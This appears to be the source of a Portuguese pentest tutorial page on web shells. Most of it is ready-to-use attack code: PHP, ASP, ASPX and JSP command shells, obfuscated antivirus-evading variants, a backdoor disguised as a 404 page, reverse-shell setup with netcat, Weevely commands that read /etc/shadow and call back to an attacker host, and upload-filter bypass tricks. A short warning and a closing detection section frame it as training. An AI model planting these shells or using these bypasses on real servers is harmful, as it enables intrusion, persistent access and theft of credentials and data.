import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function WebShells() {
  return (
    <PageContainer
      title="Web Shells — Acesso Persistente via Web"
      subtitle="Crie, implante, e use web shells em PHP, ASP, JSP e Python. Inclui Weevely, web shells do Kali, técnicas de upload bypass, ofuscação, e detecção (blue team)."
      difficulty="avancado"
      timeToRead="30 min"
    >
      <h2>O que é uma Web Shell?</h2>
      <p>
        Uma <strong>web shell</strong> é um script malicioso instalado em um servidor web que permite
        executar comandos remotamente via navegador ou requisições HTTP. Funciona como um "backdoor"
        — mesmo que a vulnerabilidade original seja corrigida, a web shell continua dando acesso.
      </p>
      <p>
        Web shells são usadas na fase de <strong>pós-exploração</strong>: depois de comprometer o
        servidor (via upload, SQLi, LFI, RCE), você implanta uma web shell para manter acesso
        persistente e facilitar a exploração futura.
      </p>

      <AlertBox type="danger" title="Apenas em ambientes autorizados">
        Implantar web shells em sistemas sem autorização é crime. Use apenas em pentests com
        escopo explícito. Sempre remova as web shells após o teste e documente tudo.
      </AlertBox>

      <h2>Web Shells em PHP — Do Básico ao Avançado</h2>
      <CodeBlock
        title="Níveis progressivos de web shells PHP"
        code={`# ═══════════════════════════════════════════════════
# NÍVEL 1: One-liner (mais simples possível)
# ═══════════════════════════════════════════════════
<?php system(\$_GET['cmd']); ?>

# USO: http://alvo.com/shell.php?cmd=whoami
# OUTPUT: www-data
#
# Como funciona:
# - \$_GET['cmd'] pega o parâmetro "cmd" da URL
# - system() executa o comando no SO e exibe o output
# - PROBLEMA: nenhuma proteção, facilmente detectável
#
# Funções PHP para execução de comandos:
# system()      — executa e exibe output
# exec()        — executa, retorna última linha
# shell_exec()  — executa, retorna output completo
# passthru()    — executa, exibe output binário (raw)
# popen()       — abre processo, retorna file pointer
# proc_open()   — controle avançado de processos
# \`\` (backticks) — atalho para shell_exec()

# ═══════════════════════════════════════════════════
# NÍVEL 2: Com formatação e POST
# ═══════════════════════════════════════════════════
<?php
if(isset(\$_POST['cmd'])) {
    echo '<pre>' . shell_exec(\$_POST['cmd']) . '</pre>';
}
?>

# USO: curl -X POST -d "cmd=ls -la" http://alvo.com/shell.php
# Vantagem: usa POST (não aparece nos logs de acesso do Apache
# que logam apenas a URL, não o body do POST)
# <pre> formata o output com espaçamento correto

# ═══════════════════════════════════════════════════
# NÍVEL 3: Com autenticação (protege contra descoberta)
# ═══════════════════════════════════════════════════
<?php
// Senha hardcoded — qualquer um com a URL precisa saber a senha
if(\$_GET['key'] !== 'S3cR3tK3y2024!') {
    http_response_code(404);
    die('<h1>404 Not Found</h1>'); // Finge ser 404
}
echo '<pre>' . shell_exec(\$_GET['cmd']) . '</pre>';
?>

# USO: http://alvo.com/shell.php?key=S3cR3tK3y2024!&cmd=id
# Sem a key correta: retorna 404 fake (parece página normal)
# Com a key: executa o comando

# ═══════════════════════════════════════════════════
# NÍVEL 4: Ofuscada (evade antivírus e grep)
# ═══════════════════════════════════════════════════
<?php
// Nenhuma palavra "system", "exec", "shell" aparece diretamente
\$f = 'sys'.'tem';    // Concatenação esconde "system"
\$f(\$_GET['c']);       // Chamada dinâmica da função
?>
# Detectores que procuram "system(" não encontram!

# Versão mais avançada:
<?php
\$a = str_rot13('flfgrz');  // "flfgrz" = rot13 de "system"
\$a(\$_REQUEST['c']);
?>

# Versão com base64:
<?php
\$f = base64_decode('c3lzdGVt');  // "c3lzdGVt" = base64 de "system"
\$f(\$_GET['c']);
?>

# Versão com variáveis de ambiente:
<?php
// O comando vem no header HTTP (mais furtivo)
\$cmd = \$_SERVER['HTTP_X_CUSTOM_HEADER'];
if(\$cmd) { echo shell_exec(\$cmd); }
?>
# USO: curl -H "X-Custom-Header: whoami" http://alvo.com/shell.php

# ═══════════════════════════════════════════════════
# NÍVEL 5: Shell completa com interface (p0wny-shell style)
# ═══════════════════════════════════════════════════
# Web shells completas incluem:
# - Terminal interativo no navegador
# - Upload/download de arquivos
# - Navegação de diretórios
# - Edição de arquivos
# - Informações do sistema
#
# Usar as shells incluídas no Kali (ver seção abaixo)`}
      />

      <h2>Web Shells do Kali Linux</h2>
      <CodeBlock
        title="Shells incluídas no Kali e como usar"
        code={`# ═══════════════════════════════════════════════════
# LOCALIZAÇÃO DAS WEB SHELLS NO KALI
# ═══════════════════════════════════════════════════
ls /usr/share/webshells/
# asp/    — Web shells para IIS (.asp)
# aspx/   — Web shells para .NET (.aspx)
# cfm/    — Web shells para ColdFusion
# jsp/    — Web shells para Tomcat/Java (.jsp)
# perl/   — Web shells em Perl (.pl)
# php/    — Web shells em PHP

ls /usr/share/webshells/php/
# findsocket/         — encontra socket do processo pai
# php-backdoor.php    — backdoor básica com interface HTML
# php-findsock-shell.php — shell via socket
# php-reverse-shell.php  — ⭐ REVERSE SHELL COMPLETA
# qsd-php-backdoor.php   — backdoor minimalista
# simple-backdoor.php    — a mais simples

# ═══════════════════════════════════════════════════
# ⭐ PHP-REVERSE-SHELL.PHP (a mais usada)
# ═══════════════════════════════════════════════════
# Esta é a reverse shell mais confiável do Kali.
# NÃO é web shell de comando — é REVERSE SHELL que
# se conecta de volta ao atacante automaticamente.

# PASSO 1: Copiar e editar
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php

# PASSO 2: Editar as variáveis (OBRIGATÓRIO!)
# Abrir shell.php e mudar:
#   \$ip = '10.0.0.1';     ← Trocar pelo SEU IP (atacante)
#   \$port = 1234;          ← Trocar pela SUA porta (ex: 4444)

# PASSO 3: Iniciar listener no atacante
nc -lvnp 4444

# PASSO 4: Upload do shell.php para o alvo
# (via upload de arquivo, SQLi, FTP, etc.)

# PASSO 5: Acessar a URL do shell
curl http://alvo.com/uploads/shell.php
# OU abrir no navegador

# RESULTADO: No terminal do atacante, aparece:
# Connection from 192.168.1.100
# Linux alvo 5.10.0 #1 SMP ...
# $ whoami
# www-data
# $ id
# uid=33(www-data) gid=33(www-data)
# → Shell completa com acesso ao servidor!

# ═══════════════════════════════════════════════════
# SIMPLE-BACKDOOR.PHP
# ═══════════════════════════════════════════════════
# A mais simples do Kali:
# <?php if(isset(\$_REQUEST['cmd'])){
#   echo "<pre>".shell_exec(\$_REQUEST['cmd'])."</pre>";}?>
# USO: http://alvo.com/shell.php?cmd=id`}
      />

      <h2>Web Shells para Windows (ASP/ASPX)</h2>
      <CodeBlock
        title="Shells para servidores IIS / .NET"
        code={`# ═══════════════════════════════════════════════════
# ASP CLÁSSICO (.asp) — IIS mais antigos
# ═══════════════════════════════════════════════════
<%
Set objShell = CreateObject("WScript.Shell")
Set objExec = objShell.Exec("cmd /c " & Request("cmd"))
Response.Write(objExec.StdOut.ReadAll())
%>
# USO: http://alvo.com/shell.asp?cmd=whoami
# OUTPUT: iis apppool\\defaultapppool

# Como funciona:
# CreateObject("WScript.Shell") — cria objeto para executar comandos
# .Exec("cmd /c " & ...) — executa via cmd.exe
#   /c = execute command and terminate
# .StdOut.ReadAll() — captura toda a saída
# Response.Write() — envia de volta ao navegador

# ═══════════════════════════════════════════════════
# ASPX (.aspx) — .NET Framework
# ═══════════════════════════════════════════════════
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request["cmd"];
if (cmd != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}
%>
# USO: http://alvo.com/shell.aspx?cmd=dir+C:\\

# ═══════════════════════════════════════════════════
# JSP (.jsp) — Tomcat/Java
# ═══════════════════════════════════════════════════
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    java.io.InputStream is = p.getInputStream();
    int c;
    while ((c = is.read()) != -1) {
        out.print((char)c);
    }
}
%>
# USO: http://alvo.com/shell.jsp?cmd=id

# Web shells do Kali para cada linguagem:
cat /usr/share/webshells/asp/cmd-asp-5.1.asp
cat /usr/share/webshells/aspx/cmdasp.aspx
cat /usr/share/webshells/jsp/jsp-reverse.jsp`}
      />

      <h2>Weevely — Web Shell Criptografada</h2>
      <CodeBlock
        title="Weevely: canal criptografado + módulos de pós-exploração"
        code={`# ═══════════════════════════════════════════════════
# O QUE É WEEVELY
# ═══════════════════════════════════════════════════
# Weevely é uma web shell PHP OFUSCADA e CRIPTOGRAFADA.
# - O código PHP gerado é completamente ilegível
# - A comunicação é criptografada (não aparece em logs)
# - Tem +30 módulos para pós-exploração
# - Já vem instalado no Kali!

# ═══════════════════════════════════════════════════
# PASSO 1: Gerar a web shell
# ═══════════════════════════════════════════════════
weevely generate minhaSenha123 /tmp/backdoor.php
# minhaSenha123 = senha para autenticação
# /tmp/backdoor.php = arquivo gerado

# O arquivo gerado é PHP ofuscado:
cat /tmp/backdoor.php
# Resultado: código ilegível, sem "system", "exec", etc.
# Antivírus e scanners de código dificilmente detectam!

# ═══════════════════════════════════════════════════
# PASSO 2: Upload para o alvo
# ═══════════════════════════════════════════════════
# Via upload de arquivo no site
# Via SQLi: SELECT ... INTO OUTFILE
# Via FTP/SSH se tiver acesso
# Via LFI + log poisoning

# ═══════════════════════════════════════════════════
# PASSO 3: Conectar ao backdoor
# ═══════════════════════════════════════════════════
weevely http://alvo.com/uploads/backdoor.php minhaSenha123

# Output:
# [+] weevely 4.0.1
# [+] Target: alvo.com
# [+] Session: /root/.weevely/sessions/alvo.com/backdoor.session
#
# www-data@alvo:/var/www/html/uploads $
# ↑ Shell interativa! Pode executar comandos normalmente

# ═══════════════════════════════════════════════════
# MÓDULOS DO WEEVELY (comandos especiais com :)
# ═══════════════════════════════════════════════════

# Informações do sistema:
:system_info                          # Info detalhada do SO
:system_extensions                    # Extensões PHP habilitadas
:system_procs                         # Processos rodando

# Manipulação de arquivos:
:file_ls /etc/                        # Listar diretório
:file_read /etc/passwd                # Ler arquivo
:file_download /etc/shadow /tmp/loot/ # Baixar arquivo para atacante
:file_upload /local/nc /tmp/nc        # Upload de arquivo
:file_edit /var/www/html/config.php   # Editar arquivo inline
:file_find / -name "*.conf"           # Buscar arquivos
:file_grep /etc/ password             # Grep em diretório

# Rede:
:net_ifconfig                         # Interfaces de rede
:net_scan 192.168.1.0/24 80,443,22    # Port scan na rede interna!
# ↑ Permite pivoting — escanear rede interna via web shell

# Banco de dados:
:sql_console -user root -passwd '' -host localhost
# Abre console SQL interativo!
# Funciona com MySQL/MariaDB

# Escalação de privilégios:
:audit_suidsgid                       # Listar binários SUID/SGID
:audit_filesystem                     # Verificar permissões inseguras
:audit_etcpasswd                      # Analisar /etc/passwd

# Backdoor avançada:
:backdoor_tcp 4444                    # Bind shell na porta 4444
:backdoor_reversetcp ATTACKER 4444    # Reverse shell TCP
:backdoor_meterpreter ATTACKER 4444   # Upgrade para Meterpreter!

# Bruteforce:
:bruteforce_sql root 3306 /wordlist.txt   # Brute MySQL`}
      />

      <h2>Técnicas de Upload Bypass</h2>
      <CodeBlock
        title="Contornar filtros de upload de arquivo"
        code={`# ═══════════════════════════════════════════════════
# BYPASS 1: Dupla extensão
# ═══════════════════════════════════════════════════
# Se o filtro bloqueia .php mas aceita .jpg:
shell.php.jpg        # Alguns servidores processam como PHP!
shell.jpg.php        # Extensão real é a última
shell.php.jpeg
shell.php.png
shell.php.gif

# ═══════════════════════════════════════════════════
# BYPASS 2: Extensões PHP alternativas
# ═══════════════════════════════════════════════════
# Se .php está bloqueado, testar variantes:
shell.php3           # PHP 3 (geralmente aceito)
shell.php4           # PHP 4
shell.php5           # PHP 5
shell.php7           # PHP 7
shell.pht            # PHP handler alternativo
shell.phtml          # PHP + HTML
shell.phps           # PHP source (pode executar)
shell.phar           # PHP Archive

# ═══════════════════════════════════════════════════
# BYPASS 3: Case sensitivity
# ═══════════════════════════════════════════════════
shell.pHp            # Se filtro verifica apenas "php" minúsculo
shell.Php
shell.PHP

# ═══════════════════════════════════════════════════
# BYPASS 4: Null byte (versões antigas PHP < 5.3.4)
# ═══════════════════════════════════════════════════
shell.php%00.jpg     # Null byte trunca → servidor vê .php
shell.php\\x00.jpg

# ═══════════════════════════════════════════════════
# BYPASS 5: Content-Type manipulation
# ═══════════════════════════════════════════════════
# Se o filtro verifica Content-Type do upload:
# Mudar de: Content-Type: application/x-php
# Para:     Content-Type: image/jpeg
# O servidor aceita como "imagem" mas o conteúdo é PHP!

# ═══════════════════════════════════════════════════
# BYPASS 6: Magic bytes (file header)
# ═══════════════════════════════════════════════════
# Se o filtro verifica os primeiros bytes do arquivo (magic number):
# Adicionar header de JPEG antes do código PHP:
# \\xFF\\xD8\\xFF\\xE0 (JPEG magic bytes)
# Seguido de: <?php system(\$_GET['cmd']); ?>
#
# Em hex: FF D8 FF E0 3C 3F 70 68 70 ...
# O filtro vê "JPEG" mas o PHP ignora os bytes iniciais

# ═══════════════════════════════════════════════════
# BYPASS 7: .htaccess override (Apache)
# ═══════════════════════════════════════════════════
# Se pode fazer upload de .htaccess:
# Upload 1: .htaccess com conteúdo:
# AddType application/x-httpd-php .evil
# Upload 2: shell.evil com código PHP
# Apache processa .evil como PHP!`}
      />

      <h2>Detecção de Web Shells (Blue Team)</h2>
      <CodeBlock
        title="Como encontrar e remover web shells instaladas"
        code={`# ═══════════════════════════════════════════════════
# BUSCA POR FUNÇÕES PERIGOSAS
# ═══════════════════════════════════════════════════
# Procurar funções de execução em todos os arquivos PHP:
grep -rn --include="*.php" \\
  "system\\|exec\\|passthru\\|shell_exec\\|popen\\|proc_open\\|eval\\|assert" \\
  /var/www/html/
# -r = recursivo
# -n = mostrar número da linha
# --include="*.php" = apenas arquivos PHP
# Resultado: lista de arquivos com funções perigosas

# Procurar ofuscação:
grep -rn --include="*.php" \\
  "base64_decode\\|str_rot13\\|gzinflate\\|gzuncompress\\|eval" \\
  /var/www/html/

# ═══════════════════════════════════════════════════
# ARQUIVOS MODIFICADOS RECENTEMENTE
# ═══════════════════════════════════════════════════
# Arquivos PHP modificados nos últimos 7 dias:
find /var/www/html -name "*.php" -mtime -7 -ls
# -mtime -7 = modificados nos últimos 7 dias
# -ls = mostrar detalhes

# Arquivos criados recentemente:
find /var/www/html -name "*.php" -newer /var/log/syslog -ls

# ═══════════════════════════════════════════════════
# FERRAMENTAS DE DETECÇÃO
# ═══════════════════════════════════════════════════
# PHP Malware Finder (PMF):
git clone https://github.com/jvoisin/php-malware-finder
cd php-malware-finder
./phpmalwarefinder /var/www/html/
# Usa regras YARA para detectar padrões de web shells

# Linux Malware Detect (maldet):
sudo apt install maldetect
maldet -a /var/www/html/
# Scan antimalware específico para servidores web

# ClamAV:
clamscan -r /var/www/html/
# -r = recursivo

# ═══════════════════════════════════════════════════
# MONITORAR CONEXÕES SUSPEITAS
# ═══════════════════════════════════════════════════
# Conexões de rede do processo web:
netstat -tlnp | grep -E ":(4444|5555|1234|9001|6666)"
# Portas comuns de reverse shell

# Processos filhos suspeitos do Apache/Nginx:
ps aux | grep -E "www-data.*(bash|sh|nc|python|perl)"
# Se www-data está rodando bash ou netcat → web shell ativa!`}
      />
    </PageContainer>
  );
}
